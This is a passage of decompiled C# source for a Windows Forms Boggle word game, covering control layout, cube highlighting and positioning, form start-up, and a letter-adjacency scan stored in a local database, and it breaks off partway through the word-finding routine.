      this.Label3.Text = "Your Score";
      this.Label4.AutoSize = true;
      this.Label4.BackColor = System.Drawing.Color.DarkGray;
      this.Label4.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Label4.ForeColor = System.Drawing.Color.Black;
      Label label4_1 = this.Label4;
      point1 = new Point(35, 272);
      Point point50 = point1;
      label4_1.Location = point50;
      this.Label4.Name = "Label4";
      Label label4_2 = this.Label4;
      size1 = new Size(54, 13);
      Size size50 = size1;
      label4_2.Size = size50;
      this.Label4.TabIndex = 65;
      this.Label4.Text = "My Score";
      this.Label5.AutoSize = true;
      this.Label5.BackColor = System.Drawing.Color.DarkGray;
      this.Label5.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Label5.ForeColor = System.Drawing.Color.Black;
      Label label5_1 = this.Label5;
      point1 = new Point(35, 187);
      Point point51 = point1;
      label5_1.Location = point51;
      this.Label5.Name = "Label5";
      Label label5_2 = this.Label5;
      size1 = new Size(56, 13);
      Size size51 = size1;
      label5_2.Size = size51;
      this.Label5.TabIndex = 66;
      this.Label5.Text = "Add Word";
      this.lblHumanWordsCount.BackColor = System.Drawing.Color.DarkGray;
      this.lblHumanWordsCount.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblHumanWordsCount.ForeColor = System.Drawing.Color.Blue;
      Label lblHumanWordsCount1 = this.lblHumanWordsCount;
      point1 = new Point(25, 378);
      Point point52 = point1;
      lblHumanWordsCount1.Location = point52;
      this.lblHumanWordsCount.Name = "lblHumanWordsCount";
      Label lblHumanWordsCount2 = this.lblHumanWordsCount;
      size1 = new Size(21, 19);
      Size size52 = size1;
      lblHumanWordsCount2.Size = size52;
      this.lblHumanWordsCount.TabIndex = 67;
      this.lblHumanWordsCount.Text = "0";
      this.lblCompWordsCount.BackColor = System.Drawing.Color.DarkGray;
      this.lblCompWordsCount.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblCompWordsCount.ForeColor = System.Drawing.Color.Blue;
      Label lblCompWordsCount1 = this.lblCompWordsCount;
      point1 = new Point(271, 378);
      Point point53 = point1;
      lblCompWordsCount1.Location = point53;
      this.lblCompWordsCount.Name = "lblCompWordsCount";
      Label lblCompWordsCount2 = this.lblCompWordsCount;
      size1 = new Size(21, 19);
      Size size53 = size1;
      lblCompWordsCount2.Size = size53;
      this.lblCompWordsCount.TabIndex = 68;
      this.lblCompWordsCount.Text = "0";
      this.btnContinue.BogButtonEnabled = false;
      this.btnContinue.ButtonText = "Continue";
      BogButton btnContinue1 = this.btnContinue;
      point1 = new Point(187, 223);
      Point point54 = point1;
      btnContinue1.Location = point54;
      this.btnContinue.Name = "btnContinue";
      BogButton btnContinue2 = this.btnContinue;
      size1 = new Size(93, 49);
      Size size54 = size1;
      btnContinue2.Size = size54;
      this.btnContinue.TabIndex = 69;
      this.btnContinue.Text = "Continue";
      this.btnScramble.BogButtonEnabled = false;
      this.btnScramble.ButtonText = "Scramble";
      BogButton btnScramble1 = this.btnScramble;
      point1 = new Point(187, 265);
      Point point55 = point1;
      btnScramble1.Location = point55;
      this.btnScramble.Name = "btnScramble";
      BogButton btnScramble2 = this.btnScramble;
      size1 = new Size(93, 49);
      Size size55 = size1;
      btnScramble2.Size = size55;
      this.btnScramble.TabIndex = 70;
      this.btnScramble.Text = "Add Word";
      this.btnFinish.BogButtonEnabled = false;
      this.btnFinish.ButtonText = " Finish ";
      BogButton btnFinish1 = this.btnFinish;
      point1 = new Point(548, 595);
      Point point56 = point1;
      btnFinish1.Location = point56;
      this.btnFinish.Name = "btnFinish";
      BogButton btnFinish2 = this.btnFinish;
      size1 = new Size(96, 49);
      Size size56 = size1;
      btnFinish2.Size = size56;
      this.btnFinish.TabIndex = 73;
      this.btnFinish.Text = "btnFinish";
      this.lblHumanRounds.BackColor = System.Drawing.Color.Silver;
      this.lblHumanRounds.BorderStyle = BorderStyle.FixedSingle;
      this.lblHumanRounds.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblHumanRounds.ForeColor = System.Drawing.Color.FromArgb(0, 0, 192);
      Label lblHumanRounds1 = this.lblHumanRounds;
      point1 = new Point(121, 244);
      Point point57 = point1;
      lblHumanRounds1.Location = point57;
      this.lblHumanRounds.Name = "lblHumanRounds";
      Label lblHumanRounds2 = this.lblHumanRounds;
      size1 = new Size(29, 19);
      Size size57 = size1;
      lblHumanRounds2.Size = size57;
      this.lblHumanRounds.TabIndex = 74;
      this.lblHumanRounds.Text = "0";
      this.lblComputerRounds.BackColor = System.Drawing.Color.Silver;
      this.lblComputerRounds.BorderStyle = BorderStyle.FixedSingle;
      this.lblComputerRounds.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblComputerRounds.ForeColor = System.Drawing.Color.FromArgb(0, 0, 192);
      Label lblComputerRounds1 = this.lblComputerRounds;
      point1 = new Point(121, 289);
      Point point58 = point1;
      lblComputerRounds1.Location = point58;
      this.lblComputerRounds.Name = "lblComputerRounds";
      Label lblComputerRounds2 = this.lblComputerRounds;
      size1 = new Size(29, 19);
      Size size58 = size1;
      lblComputerRounds2.Size = size58;
      this.lblComputerRounds.TabIndex = 75;
      this.lblComputerRounds.Text = "0";
      this.Label7.AutoSize = true;
      this.Label7.BackColor = System.Drawing.Color.DarkGray;
      this.Label7.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Label7.ForeColor = System.Drawing.Color.Black;
      Label label7_1 = this.Label7;
      point1 = new Point(121, 230);
      Point point59 = point1;
      label7_1.Location = point59;
      this.Label7.Name = "Label7";
      Label label7_2 = this.Label7;
      size1 = new Size(45, 13);
      Size size59 = size1;
      label7_2.Size = size59;
      this.Label7.TabIndex = 76;
      this.Label7.Text = "Rounds";
      this.Label8.AutoSize = true;
      this.Label8.BackColor = System.Drawing.Color.DarkGray;
      this.Label8.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Label8.ForeColor = System.Drawing.Color.Black;
      Label label8_1 = this.Label8;
      point1 = new Point(121, 275);
      Point point60 = point1;
      label8_1.Location = point60;
      this.Label8.Name = "Label8";
      Label label8_2 = this.Label8;
      size1 = new Size(45, 13);
      Size size60 = size1;
      label8_2.Size = size60;
      this.Label8.TabIndex = 77;
      this.Label8.Text = "Rounds";
      this.lblRound.AutoSize = true;
      this.lblRound.BackColor = System.Drawing.Color.DarkGray;
      this.lblRound.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblRound.ForeColor = System.Drawing.Color.Blue;
      Label lblRound1 = this.lblRound;
      point1 = new Point(599, 32);
      Point point61 = point1;
      lblRound1.Location = point61;
      this.lblRound.Name = "lblRound";
      Label lblRound2 = this.lblRound;
      size1 = new Size(13, 15);
      Size size61 = size1;
      lblRound2.Size = size61;
      this.lblRound.TabIndex = 72;
      this.lblRound.Text = "0";
      this.Label6.AutoSize = true;
      this.Label6.BackColor = System.Drawing.Color.DarkGray;
      this.Label6.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Label6.ForeColor = System.Drawing.Color.Blue;
      Label label6_1 = this.Label6;
      point1 = new Point(543, 31);
      Point point62 = point1;
      label6_1.Location = point62;
      this.Label6.Name = "Label6";
      Label label6_2 = this.Label6;
      size1 = new Size(53, 15);
      Size size62 = size1;
      label6_2.Size = size62;
      this.Label6.TabIndex = 71;
      this.Label6.Text = "Round: ";
      this.BogBorder5.BackColor = System.Drawing.Color.DarkGray;
      this.BogBorder5.BorderDirection = BogBorder.Direction.Left;
      BogBorder bogBorder5_1 = this.BogBorder5;
      point1 = new Point(356, 44);
      Point point63 = point1;
      bogBorder5_1.Location = point63;
      this.BogBorder5.Name = "BogBorder5";
      BogBorder bogBorder5_2 = this.BogBorder5;
      size1 = new Size(11, 556);
      Size size63 = size1;
      bogBorder5_2.Size = size63;
      this.BogBorder5.TabIndex = 13;
      this.BogBorder5.TabStop = false;
      this.Panel3.BackColor = System.Drawing.Color.Black;
      Panel panel3_1 = this.Panel3;
      point1 = new Point(365, 57);
      Point point64 = point1;
      panel3_1.Location = point64;
      this.Panel3.Name = "Panel3";
      Panel panel3_2 = this.Panel3;
      size1 = new Size(430, 18);
      Size size64 = size1;
      panel3_2.Size = size64;
      this.Panel3.TabIndex = 45;
      this.Panel2.BackColor = System.Drawing.Color.Black;
      Panel panel2_1 = this.Panel2;
      point1 = new Point(780, 72);
      Point point65 = point1;
      panel2_1.Location = point65;
      this.Panel2.Name = "Panel2";
      Panel panel2_2 = this.Panel2;
      size1 = new Size(15, 100);
      Size size65 = size1;
      panel2_2.Size = size65;
      this.Panel2.TabIndex = 44;
      this.txtMain.BackColor = System.Drawing.Color.Black;
      this.txtMain.BorderStyle = BorderStyle.None;
      this.txtMain.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.txtMain.ForeColor = System.Drawing.Color.DodgerBlue;
      RichTextBox txtMain1 = this.txtMain;
      point1 = new Point(381, 75);
      Point point66 = point1;
      txtMain1.Location = point66;
      this.txtMain.Name = "txtMain";
      RichTextBox txtMain2 = this.txtMain;
      size1 = new Size(399, 99);
      Size size66 = size1;
      txtMain2.Size = size66;
      this.txtMain.TabIndex = 18;
      this.txtMain.Text = "";
      this.BogBorder4.BackColor = System.Drawing.Color.DarkGray;
      this.BogBorder4.BorderDirection = BogBorder.Direction.Bottom;
      BogBorder bogBorder4_1 = this.BogBorder4;
      point1 = new Point(367, 589);
      Point point67 = point1;
      bogBorder4_1.Location = point67;
      this.BogBorder4.Name = "BogBorder4";
      BogBorder bogBorder4_2 = this.BogBorder4;
      size1 = new Size(428, 10);
      Size size67 = size1;
      bogBorder4_2.Size = size67;
      this.BogBorder4.TabIndex = 12;
      this.BogBorder4.TabStop = false;
      this.BogBorder3.BackColor = System.Drawing.Color.DarkGray;
      this.BogBorder3.BorderDirection = BogBorder.Direction.Right;
      BogBorder bogBorder3_1 = this.BogBorder3;
      point1 = new Point(795, 47);
      Point point68 = point1;
      bogBorder3_1.Location = point68;
      this.BogBorder3.Name = "BogBorder3";
      BogBorder bogBorder3_2 = this.BogBorder3;
      size1 = new Size(11, 552);
      Size size68 = size1;
      bogBorder3_2.Size = size68;
      this.BogBorder3.TabIndex = 11;
      this.BogBorder3.TabStop = false;
      this.BogBorder1.BackColor = System.Drawing.Color.DarkGray;
      this.BogBorder1.BorderDirection = BogBorder.Direction.Top;
      BogBorder bogBorder1_1 = this.BogBorder1;
      point1 = new Point(367, 46);
      Point point69 = point1;
      bogBorder1_1.Location = point69;
      this.BogBorder1.Name = "BogBorder1";
      BogBorder bogBorder1_2 = this.BogBorder1;
      size1 = new Size(428, 12);
      Size size69 = size1;
      bogBorder1_2.Size = size69;
      this.BogBorder1.TabIndex = 9;
      this.BogBorder1.TabStop = false;
      this.picCubesUp.BackColor = System.Drawing.Color.Black;
      PictureBox picCubesUp1 = this.picCubesUp;
      point1 = new Point(365, 172);
      Point point70 = point1;
      picCubesUp1.Location = point70;
      this.picCubesUp.Name = "picCubesUp";
      PictureBox picCubesUp2 = this.picCubesUp;
      size1 = new Size(430, 417);
      Size size70 = size1;
      picCubesUp2.Size = size70;
      this.picCubesUp.TabIndex = 5;
      this.picCubesUp.TabStop = false;
      this.CircleLabel1.BackColor = System.Drawing.Color.LightGray;
      this.CircleLabel1.CubeHighLight = System.Drawing.Color.LightGray;
      this.CircleLabel1.CubeText = "W";
      this.CircleLabel1.CubeTextColor = System.Drawing.Color.DarkBlue;
      this.CircleLabel1.CubeTopRadius = 55L;
      CircleLabel circleLabel1_1 = this.CircleLabel1;
      point1 = new Point(394, 415);
      Point point71 = point1;
      circleLabel1_1.Location = point71;
      this.CircleLabel1.Name = "CircleLabel1";
      CircleLabel circleLabel1_2 = this.CircleLabel1;
      size1 = new Size(55, 55);
      Size size71 = size1;
      circleLabel1_2.Size = size71;
      this.CircleLabel1.TabIndex = 31;
      this.CircleLabel1.Tag = (object) "03";
      this.CircleLabel2.BackColor = System.Drawing.Color.LightGray;
      this.CircleLabel2.CubeHighLight = System.Drawing.Color.LightGray;
      this.CircleLabel2.CubeText = "W";
      this.CircleLabel2.CubeTextColor = System.Drawing.Color.DarkBlue;
      this.CircleLabel2.CubeTopRadius = 55L;
      CircleLabel circleLabel2_1 = this.CircleLabel2;
      point1 = new Point(398, 340);
      Point point72 = point1;
      circleLabel2_1.Location = point72;
      this.CircleLabel2.Name = "CircleLabel2";
      CircleLabel circleLabel2_2 = this.CircleLabel2;
      size1 = new Size(55, 55);
      Size size72 = size1;
      circleLabel2_2.Size = size72;
      this.CircleLabel2.TabIndex = 27;
      this.CircleLabel2.Tag = (object) "02";
      this.CircleLabel3.BackColor = System.Drawing.Color.LightGray;
      this.CircleLabel3.CubeHighLight = System.Drawing.Color.LightGray;
      this.CircleLabel3.CubeText = "W";
      this.CircleLabel3.CubeTextColor = System.Drawing.Color.DarkBlue;
      this.CircleLabel3.CubeTopRadius = 55L;
      CircleLabel circleLabel3_1 = this.CircleLabel3;
      point1 = new Point(468, 412);
      Point point73 = point1;
      circleLabel3_1.Location = point73;
      this.CircleLabel3.Name = "CircleLabel3";
      CircleLabel circleLabel3_2 = this.CircleLabel3;
      size1 = new Size(55, 55);
      Size size73 = size1;
      circleLabel3_2.Size = size73;
      this.CircleLabel3.TabIndex = 32;
      this.CircleLabel3.Tag = (object) "13";
      this.PictureBox1.BackColor = System.Drawing.Color.Black;
      PictureBox pictureBox1_1 = this.PictureBox1;
      point1 = new Point(370, 172);
      Point point74 = point1;
      pictureBox1_1.Location = point74;
      this.PictureBox1.Name = "PictureBox1";
      PictureBox pictureBox1_2 = this.PictureBox1;
      size1 = new Size(430, 417);
      Size size74 = size1;
      pictureBox1_2.Size = size74;
      this.PictureBox1.TabIndex = 5;
      this.PictureBox1.TabStop = false;
      size1 = new Size(5, 13);
      this.AutoScaleBaseSize = size1;
      this.BackColor = System.Drawing.Color.Black;
      size1 = new Size(848, 646);
      this.ClientSize = size1;
      this.Controls.AddRange(new Control[73]
      {
        (Control) this.lblCompWordsCount,
        (Control) this.lblHumanWordsCount,
        (Control) this.Label2,
        (Control) this.Label1,
        (Control) this.Label8,
        (Control) this.Label7,
        (Control) this.Label5,
        (Control) this.Label4,
        (Control) this.Label3,
        (Control) this.lblRound,
        (Control) this.Label6,
        (Control) this.BogBorder13,
        (Control) this.BogBorder14,
        (Control) this.BogBorder15,
        (Control) this.BogBorder16,
        (Control) this.lstCompFoundWords,
        (Control) this.BogBorder12,
        (Control) this.BogBorder11,
        (Control) this.BogBorder10,
        (Control) this.BogBorder9,
        (Control) this.lstHumanWordsFound,
        (Control) this.lblComputerRounds,
        (Control) this.lblHumanRounds,
        (Control) this.lblCompScore,
        (Control) this.lblHumanScore,
        (Control) this.txtWordFound,
        (Control) this.btnScramble,
        (Control) this.btnContinue,
        (Control) this.btnAddWord,
        (Control) this.tmrBtn4,
        (Control) this.tmrBtn3,
        (Control) this.tmrBtn2,
        (Control) this.tmrBtn1,
        (Control) this.BogBorder8,
        (Control) this.BogBorder7,
        (Control) this.BogBorder6,
        (Control) this.BogBorder2,
        (Control) this.tmrMain,
        (Control) this.btnFinish,
        (Control) this.BogBorder5,
        (Control) this.Panel3,
        (Control) this.Panel2,
        (Control) this.Panel1,
        (Control) this.picCubeDown,
        (Control) this.lbl16,
        (Control) this.lbl15,
        (Control) this.lbl14,
        (Control) this.lbl13,
        (Control) this.lbl12,
        (Control) this.lbl11,
        (Control) this.lbl10,
        (Control) this.lbl9,
        (Control) this.lbl8,
        (Control) this.lbl7,
        (Control) this.lbl6,
        (Control) this.lbl5,
        (Control) this.lbl2,
        (Control) this.lbl3,
        (Control) this.lbl4,
        (Control) this.lbl1,
        (Control) this.txtMain,
        (Control) this.BogBorder4,
        (Control) this.BogBorder3,
        (Control) this.BogBorder1,
        (Control) this.pnlTimer,
        (Control) this.picCubesUp,
        (Control) this.pnlScore,
        (Control) this.pnlWords,
        (Control) this.CircleLabel1,
        (Control) this.CircleLabel2,
        (Control) this.CircleLabel3,
        (Control) this.PictureBox1,
        (Control) this.pnlCubes
      });
      this.FormBorderStyle = FormBorderStyle.FixedDialog;
      this.MaximizeBox = false;
      this.Menu = this.mnuMain;
      this.Name = nameof (frmMain);
      this.Text = "Boggle .Net";
      this.ResumeLayout(false);
    }

    private void CubeClick(CircleLabel sender, EventArgs e)
    {
      VBMath.Randomize();
      System.Drawing.Color color;
      switch (Math.Round((double) (Conversion.Int(VBMath.Rnd() * 6f) + 1f)))
      {
        case 1.0:
          color = System.Drawing.Color.Indigo;
          break;
        case 2.0:
          color = System.Drawing.Color.DarkGreen;
          break;
        case 3.0:
          color = System.Drawing.Color.Crimson;
          break;
        case 4.0:
          color = System.Drawing.Color.Yellow;
          break;
        case 5.0:
          color = System.Drawing.Color.DarkOrange;
          break;
        default:
          color = System.Drawing.Color.Pink;
          break;
      }
      if (StringType.StrCmp(modGlobal.Cubes[checked (IntegerType.FromString(Strings.Mid(sender.Name, 4)) - 1)].CubeHighLight.ToString(), System.Drawing.Color.Aquamarine.ToString(), false) == 0)
      {
        modGlobal.Cubes[checked (IntegerType.FromString(Strings.Mid(sender.Name, 4)) - 1)].CubeHighLight = System.Drawing.Color.LightGray;
        modGlobal.Cubes[checked (IntegerType.FromString(Strings.Mid(sender.Name, 4)) - 1)].CubeTextColor = System.Drawing.Color.DarkBlue;
        this.ResetCubes();
      }
      else
      {
        try
        {
          foreach (Cube cube in (CollectionBase) modGlobal.Cubes)
          {
            modGlobal.myCube = cube;
            modGlobal.myCube.CubeDownPic = (PictureBox) null;
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            ((IDisposable) enumerator).Dispose();
        }
        if (ObjectType.ObjTst(modGlobal.Cubes[checked (IntegerType.FromString(Strings.Mid(sender.Name, 4)) - 1)].CubeTopRadius, (object) 55, false) != 0)
        {
          this.ResetCubes();
        }
        else
        {
          this.ResetCubes();
          modGlobal.Cubes[checked (IntegerType.FromString(Strings.Mid(sender.Name, 4)) - 1)].CubeDownPic = this.picCubeDown;
          modGlobal.Cubes[checked (IntegerType.FromString(Strings.Mid(sender.Name, 4)) - 1)].ShowClick();
          modGlobal.Cubes[checked (IntegerType.FromString(Strings.Mid(sender.Name, 4)) - 1)].CubeHighLight = System.Drawing.Color.Aquamarine;
          modGlobal.Cubes[checked (IntegerType.FromString(Strings.Mid(sender.Name, 4)) - 1)].CubeTextColor = color;
          modGlobal.Cubes[checked (IntegerType.FromString(Strings.Mid(sender.Name, 4)) - 1)].CubeLabel.BringToFront();
        }
      }
    }

    private void ResetCubes()
    {
      this.picCubeDown.Visible = false;
      try
      {
        foreach (Cube cube in (CollectionBase) modGlobal.Cubes)
        {
          modGlobal.myCube = cube;
          if (ObjectType.ObjTst(modGlobal.myCube.CubeTopRadius, (object) 55, false) != 0)
          {
            modGlobal.myCube.CubeLabel.SendToBack();
            modGlobal.myCube.IsBack = true;
            modGlobal.myCube.CubeTopRadius = (object) 55;
          }
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          ((IDisposable) enumerator).Dispose();
      }
      modGlobal.Cubes[0].CubeTopLeft = (long) checked (this.picCubesUp.Left + 79);
      int Index1 = 1;
      do
      {
        modGlobal.Cubes[Index1].CubeTopLeft = checked (modGlobal.Cubes[Index1 - 1].CubeTopLeft + modGlobal.Cubes[Index1 - 1].CubeTopWidth + 15L);
        checked { ++Index1; }
      }
      while (Index1 <= 3);
      modGlobal.Cubes[4].CubeTopLeft = (long) checked (this.picCubesUp.Left + 79);
      int Index2 = 5;
      do
      {
        modGlobal.Cubes[Index2].CubeTopLeft = checked (modGlobal.Cubes[Index2 - 1].CubeTopLeft + modGlobal.Cubes[Index2 - 1].CubeTopWidth + 15L);
        checked { ++Index2; }
      }
      while (Index2 <= 7);
      modGlobal.Cubes[8].CubeTopLeft = (long) checked (this.picCubesUp.Left + 79);
      int Index3 = 9;
      do
      {
        modGlobal.Cubes[Index3].CubeTopLeft = checked (modGlobal.Cubes[Index3 - 1].CubeTopLeft + modGlobal.Cubes[Index3 - 1].CubeTopWidth + 15L);
        checked { ++Index3; }
      }
      while (Index3 <= 11);
      modGlobal.Cubes[12].CubeTopLeft = (long) checked (this.picCubesUp.Left + 79);
      int Index4 = 13;
      do
      {
        modGlobal.Cubes[Index4].CubeTopLeft = checked (modGlobal.Cubes[Index4 - 1].CubeTopLeft + modGlobal.Cubes[Index4 - 1].CubeTopWidth + 15L);
        checked { ++Index4; }
      }
      while (Index4 <= 15);
      int Index5 = 0;
      do
      {
        modGlobal.Cubes[Index5].CubeTopTop = (long) checked (this.picCubesUp.Top + 69);
        checked { ++Index5; }
      }
      while (Index5 <= 3);
      int Index6 = 4;
      do
      {
        modGlobal.Cubes[Index6].CubeTopTop = checked (modGlobal.Cubes[0].CubeTopHeight + (long) this.picCubesUp.Top + 84L);
        checked { ++Index6; }
      }
      while (Index6 <= 7);
      int Index7 = 8;
      do
      {
        modGlobal.Cubes[Index7].CubeTopTop = checked (modGlobal.Cubes[4].CubeTopHeight + modGlobal.Cubes[4].CubeTopTop + 14L);
        checked { ++Index7; }
      }
      while (Index7 <= 11);
      int Index8 = 12;
      do
      {
        modGlobal.Cubes[Index8].CubeTopTop = checked (modGlobal.Cubes[8].CubeTopHeight + modGlobal.Cubes[8].CubeTopTop + 14L);
        checked { ++Index8; }
      }
      while (Index8 <= 15);
      try
      {
        foreach (Cube cube in (CollectionBase) modGlobal.Cubes)
        {
          modGlobal.myCube = cube;
          if (modGlobal.myCube.IsBack)
          {
            modGlobal.myCube.IsBack = false;
            modGlobal.myCube.CubeLabel.BringToFront();
          }
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          ((IDisposable) enumerator).Dispose();
      }
    }

    private void frmMain_Load(object sender, EventArgs e)
    {
      this.Left = checked ((int) Math.Round(unchecked ((double) Screen.PrimaryScreen.Bounds.Width / 2.0 - (double) this.Width / 2.0)));
      this.Top = checked ((int) Math.Round(unchecked ((double) Screen.PrimaryScreen.Bounds.Height / 2.0 - (double) this.Height / 2.0)));
      int num = 0;
      do
      {
        Cube Cube = new Cube();
        modGlobal.Cubes.Add(Cube);
        checked { ++num; }
      }
      while (num <= 15);
      this.FindWordsThread = new Thread(new ThreadStart(this.FindAllWords));
      this.ShowWordThread = new Thread(new ThreadStart(this.ShowWord));
      modGlobal.Cubes[0].CubeLabel = this.lbl1;
      modGlobal.Cubes[1].CubeLabel = this.lbl2;
      modGlobal.Cubes[2].CubeLabel = this.lbl3;
      modGlobal.Cubes[3].CubeLabel = this.lbl4;
      modGlobal.Cubes[4].CubeLabel = this.lbl5;
      modGlobal.Cubes[5].CubeLabel = this.lbl6;
      modGlobal.Cubes[6].CubeLabel = this.lbl7;
      modGlobal.Cubes[7].CubeLabel = this.lbl8;
      modGlobal.Cubes[8].CubeLabel = this.lbl9;
      modGlobal.Cubes[9].CubeLabel = this.lbl10;
      modGlobal.Cubes[10].CubeLabel = this.lbl11;
      modGlobal.Cubes[11].CubeLabel = this.lbl12;
      modGlobal.Cubes[12].CubeLabel = this.lbl13;
      modGlobal.Cubes[13].CubeLabel = this.lbl14;
      modGlobal.Cubes[14].CubeLabel = this.lbl15;
      modGlobal.Cubes[15].CubeLabel = this.lbl16;
      this.ResetCubes();
      modGlobal.Cubes.CubesPicBox = this.picCubesUp;
      this.ShowDisplayText("", false, false, 0);
      this.ChangeMode((object) this.mnuVsMode, new EventArgs());
      this.ChangeLevel((object) this.mnuLevelMedium, new EventArgs());
      this.ChangeTimerInterval((object) this.mnuTmr300, new EventArgs());
      this.mnuEnableWordValidation.Checked = true;
    }

    public void ScanLetters()
    {
      modGlobal.cmdBog.CommandText = "Delete From PossibleLetters";
      modGlobal.conBoggle.Open();
      modGlobal.cmdBog.ExecuteNonQuery();
      modGlobal.conBoggle.Close();
      int num = 0;
      do
      {
        while (true)
        {
          int nextLetterSquare = this.FindNextLetterSquare(num);
          if (nextLetterSquare != -1)
          {
            modGlobal.conBoggle.Open();
            modGlobal.cmdBog.CommandText = "Insert Into PossibleLetters (BaseLetterSquare,BaseLetter,FriendLetterSquare,FriendLetter) Values (" + StringType.FromInteger(num) + ",'" + modGlobal.Cubes[num].CubeLetter + "'," + StringType.FromInteger(nextLetterSquare) + ",'" + modGlobal.Cubes[nextLetterSquare].CubeLetter + "')";
            modGlobal.cmdBog.ExecuteNonQuery();
            modGlobal.conBoggle.Close();
          }
          else
            break;
        }
        checked { ++num; }
      }
      while (num <= 15);
      this.FindNextLetterSquare(-100);
    }

    public int FindNextLetterSquare(int LetterSquare)
    {
      if (this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection\u0024Init.State != (short) 1)
      {
        Monitor.Enter((object) this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection\u0024Init);
        try
        {
          if (this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection\u0024Init.State == (short) 0)
          {
            this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection\u0024Init.State = (short) 2;
            this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection = new bool[16, 9];
          }
          else if (this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection\u0024Init.State == (short) 2)
            throw new IncompleteInitialization();
        }
        finally
        {
          this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection\u0024Init.State = (short) 1;
          Monitor.Exit((object) this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection\u0024Init);
        }
      }
      int nextLetterSquare;
      if (LetterSquare == -100)
      {
        this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection = new bool[16, 9];
      }
      else
      {
        int num;
        if (Strings.InStr(",0,1,2,3,7,11,15,", "," + StringType.FromInteger(LetterSquare) + ",") == 0 & !this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection[LetterSquare, 7])
        {
          this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection[LetterSquare, 7] = true;
          num = checked (LetterSquare - 3);
        }
        else if (Strings.InStr(",3,7,11,15,", "," + StringType.FromInteger(LetterSquare) + ",") == 0 & !this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection[LetterSquare, 0])
        {
          this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection[LetterSquare, 0] = true;
          num = checked (LetterSquare + 1);
        }
        else if (Strings.InStr(",3,7,11,15,14,13,12,", "," + StringType.FromInteger(LetterSquare) + ",") == 0 & !this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection[LetterSquare, 1])
        {
          this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection[LetterSquare, 1] = true;
          num = checked (LetterSquare + 5);
        }
        else if (Strings.InStr(",12,13,14,15,", "," + StringType.FromInteger(LetterSquare) + ",") == 0 & !this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection[LetterSquare, 2])
        {
          this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection[LetterSquare, 2] = true;
          num = checked (LetterSquare + 4);
        }
        else if (Strings.InStr(",0,4,8,12,13,14,15,", "," + StringType.FromInteger(LetterSquare) + ",") == 0 & !this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection[LetterSquare, 3])
        {
          this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection[LetterSquare, 3] = true;
          num = checked (LetterSquare + 3);
        }
        else if (Strings.InStr(",0,4,8,12,", "," + StringType.FromInteger(LetterSquare) + ",") == 0 & !this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection[LetterSquare, 4])
        {
          this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection[LetterSquare, 4] = true;
          num = checked (LetterSquare - 1);
        }
        else if (Strings.InStr(",0,4,8,12,1,2,3,", "," + StringType.FromInteger(LetterSquare) + ",") == 0 & !this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection[LetterSquare, 5])
        {
          this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection[LetterSquare, 5] = true;
          num = checked (LetterSquare - 5);
        }
        else if (Strings.InStr(",0,1,2,3,", "," + StringType.FromInteger(LetterSquare) + ",") == 0 & !this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection[LetterSquare, 6])
        {
          this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection[LetterSquare, 6] = true;
          num = checked (LetterSquare - 4);
        }
        else
          num = -1;
        nextLetterSquare = num;
      }
      return nextLetterSquare;
    }

    private void FindAllWords()
    {
      this.mnuEndGame.Enabled = false;
      this.ScanLetters();
      string Word;
      this.FoundWords = modFindWords.FindWords(modFindWords.FindMode.AllWords, Word);
      string sLeft;
      switch (modGlobal.GameMode)
      {
        case modGlobal.Mode.Vs:
          sLeft = "\r\nComputer: I found all my words!";
          break;
      }
      VBMath.Randomize();
      int num1;
      switch (modGlobal.GameLevel)
      {
        case modGlobal.Level.Easy:
